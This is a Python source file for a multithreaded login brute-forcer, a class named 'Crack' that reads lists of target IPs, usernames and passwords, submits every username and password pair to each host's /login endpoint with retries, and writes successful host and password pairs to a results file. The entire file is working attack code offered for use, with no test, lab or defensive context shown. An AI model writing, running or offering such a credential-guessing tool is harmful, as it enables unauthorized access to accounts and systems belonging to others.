import os
import time
import requests as req
import json
import typer
from rich.progress import Progress
import concurrent.futures
import threading

class Crack:
    def __init__(self):
        self.lock = threading.Lock()  

    def make_request_with_retries(self, url: str, data: dict, max_retries: int = 6) :
        attempt = 0
        while attempt < max_retries:
            try:
                response = req.post(url=url, data=data, timeout=60)
                return response
            except req.RequestException as e:
                attempt += 1
                if attempt < max_retries:
                    typer.secho(f"Retrying request to {url} ({attempt}/{max_retries})...", fg=typer.colors.YELLOW)
                    time.sleep(1.5)  
                else:
                    typer.secho(f"Failed request to {url} after {max_retries} attempts: {e}", fg=typer.colors.RED)


    def read_file(self, path: str):
        if os.path.exists(path):
            with open(path, "r") as file:
                return list(set(line.strip() for line in file))
        else:
            raise Exception(f"Not Found {path}")
            

    def save_cracked(self, data, path_cracked):
        with self.lock:  
            os.makedirs("result", exist_ok=True)
            with open(os.path.join("result", path_cracked), "a+", encoding="utf-8") as file:
                file.writelines(data)

    def is_ip_up(self, ip: str) -> bool:
        try:
            response = req.get(url=ip, timeout=60)
            return response.ok
        except (req.RequestException, ValueError):
            return False

    def crack(self, path_ip_list: str, path_userlist: str, path_passwordlist: str, path_cracked: str,thread:int):
        ip_list = self.read_file(path_ip_list)
        usernamelist = self.read_file(path_userlist)
        passwordlist = self.read_file(path_passwordlist)
        cracked = []

        def process_ip(ip):
            if not self.is_ip_up(ip):
                typer.secho(f"IP not reachable: {ip}", fg=typer.colors.YELLOW)
                return
            
            for username in usernamelist:
                for password in passwordlist:
                    should_break = False
                    try:
                        data = {"username": username, "password": password}
                        response = self.make_request_with_retries(url=f"{ip}/login", data=data)
                        
                        if response.status_code == 404:
                            typer.secho(f"404 Not Found: {ip}", fg=typer.colors.YELLOW)
                            should_break = True
                            break
                        
                        try:
                            json_data = response.json()
                        except json.JSONDecodeError:
                            typer.secho(f"Invalid JSON response from {ip}", fg=typer.colors.YELLOW)
                            should_break = True
                            break

                        if json_data.get("success"):
                            with self.lock:
                                cracked.append(f"{ip} => password => {password}\n")
                            return  # Exit the function once a successful login is found
                    except Exception as e:
                        typer.secho(f"Request error for {ip}: {e}", fg=typer.colors.RED)
                        should_break = True
                        break
                    progress.update(password_task, advance=1)
                    time.sleep(0.5)
                progress.update(username_task, advance=1)
                if should_break:
                    break
            
        with Progress() as progress:
            ip_task = progress.add_task("[green]Processing IPs", total=len(ip_list))
            username_task=progress.add_task("[blue]Processing Usernames", total=len(usernamelist))
            password_task=progress.add_task("[Yellow]Processing Passwords", total=len(passwordlist))
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
                futures = [executor.submit(process_ip, ip) for ip in ip_list]
                for future in concurrent.futures.as_completed(futures):
                    progress.update(ip_task, advance=1)
                    try:
                        future.result()
                    except Exception as e:
                        typer.secho(f"Exception occurred: {e}", fg=typer.colors.RED)

        self.save_cracked(cracked, path_cracked)
        typer.secho("\nEnd", fg=typer.colors.GREEN)



